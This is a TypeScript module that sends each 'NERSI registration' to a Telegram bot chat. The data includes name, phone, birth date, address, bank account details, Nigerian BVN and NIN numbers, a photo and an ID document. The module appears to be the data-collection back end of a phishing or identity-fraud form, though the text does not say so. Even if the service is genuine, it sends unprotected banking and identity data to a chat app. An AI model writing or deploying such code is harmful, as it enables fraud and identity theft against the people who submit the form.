const MAX_TEXT = 4000;
const TIMEOUT_MS = 15_000;

function esc(v: unknown) {
  return String(v ?? "—")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function api(token: string, method: string) {
  return `https://api.telegram.org/bot${token}/${method}`;
}

async function call(token: string, method: string, body: BodyInit) {
  const res = await fetch(api(token, method), {
    method: "POST",
    body,
    signal: AbortSignal.timeout(TIMEOUT_MS),
  });

  const json = await res.json().catch(() => null);
  if (!res.ok || !json?.ok) {
    throw new Error(
      `Telegram ${method} failed: ${res.status} ${JSON.stringify(json)}`,
    );
  }
  return json;
}

export type RegistrationRecord = {
  ref: string;
  fullName: string;
  phone: string;
  dob: string;
  email: string;
  address: string;
  bankName: string;
  accountNumber: string;
  accountName: string;
  bvn: string;
  nin: string;
  idType: string;
};

export async function notifyTelegram(
  r: RegistrationRecord,
  files: { photo?: File | null; idFile?: File | null } = {},
) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    console.warn(
      "[telegram] TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID missing — skipping notify",
    );
    return;
  }

  const text = [
    "🟢 <b>New NERSI registration</b>",
    "",
    `<b>Ref:</b> <code>${esc(r.ref)}</code>`,
    `<b>Name:</b> ${esc(r.fullName)}`,
    `<b>Phone:</b> ${esc(r.phone)}`,
    `<b>DOB:</b> ${esc(r.dob)}`,
    `<b>Email:</b> ${esc(r.email)}`,
    `<b>Address:</b> ${esc(r.address)}`,
    "",
    "🏦 <b>Bank account</b>",
    `<b>Bank:</b> ${esc(r.bankName)}`,
    `<b>Account number:</b> <code>${esc(r.accountNumber)}</code>`,
    `<b>Account name:</b> ${esc(r.accountName)}`,
    "",
    `<b>BVN:</b> <code>${esc(r.bvn)}</code>`,
    `<b>NIN:</b> <code>${esc(r.nin)}</code>`,
    `<b>ID type:</b> ${esc(r.idType)}`,
    "",
    `<i>${new Date().toLocaleString("en-NG", { timeZone: "Africa/Lagos" })}</i>`,
  ]
    .join("\n")
    .slice(0, MAX_TEXT);

  await call(
    token,
    "sendMessage",
    new URLSearchParams({
      chat_id: chatId,
      text,
      parse_mode: "HTML",
      disable_web_page_preview: "true",
    }),
  );

  const send = async (
    method: "sendPhoto" | "sendDocument",
    file: File,
    caption: string,
  ) => {
    try {
      const fd = new FormData();
      fd.append("chat_id", chatId);
      fd.append(method === "sendPhoto" ? "photo" : "document", file);
      fd.append("caption", caption.slice(0, 900));
      await call(token, method, fd);
    } catch (err) {
      console.error(`[telegram] ${method} failed`, err);
    }
  };

  if (files.photo?.size) await send("sendPhoto", files.photo, `Photo — ${r.ref}`);
  if (files.idFile?.size) await send("sendDocument", files.idFile, `ID document — ${r.ref}`);
}
